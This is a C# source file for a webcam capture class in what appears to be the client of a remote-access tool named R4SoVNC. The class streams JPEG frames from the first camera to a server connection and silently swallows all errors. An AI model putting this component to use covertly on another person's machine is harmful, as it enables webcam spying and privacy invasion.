using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using AForge.Video;
using AForge.Video.DirectShow;
using R4SoVNC.ClientEmbed.Network;
using R4SoVNC.ClientEmbed.Protocol;

namespace R4SoVNC.ClientEmbed.Capture
{
    internal class CameraCapturer : IDisposable
    {
        private readonly ServerConnection _conn;
        private VideoCaptureDevice? _device;
        private bool _active;

        public CameraCapturer(ServerConnection conn) => _conn = conn;

        public void Start()
        {
            if (_active) return;
            try
            {
                var devs = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devs.Count == 0) return;
                _device = new VideoCaptureDevice(devs[0].MonikerString);
                _device.NewFrame += OnFrame;
                _device.Start();
                _active = true;
            }
            catch { }
        }

        private void OnFrame(object sender, NewFrameEventArgs e)
        {
            if (!_active || !_conn.IsConnected) return;
            try
            {
                using var bmp  = (Bitmap)e.Frame.Clone();
                using var ms   = new MemoryStream();
                var       enc  = GetJpegEncoder();
                var       pars = new EncoderParameters(1);
                pars.Param[0]  = new EncoderParameter(Encoder.Quality, 50L);
                bmp.Save(ms, enc, pars);
                _conn.Send(new Packet(PacketType.CameraFrame, ms.ToArray()));
            }
            catch { }
        }

        public void Stop()
        {
            _active = false;
            try { _device?.SignalToStop(); _device?.WaitForStop(); } catch { }
            _device = null;
        }

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders())
                if (c.MimeType == "image/jpeg") return c;
            throw new Exception("JPEG encoder not found");
        }

        public void Dispose() => Stop();
    }
}
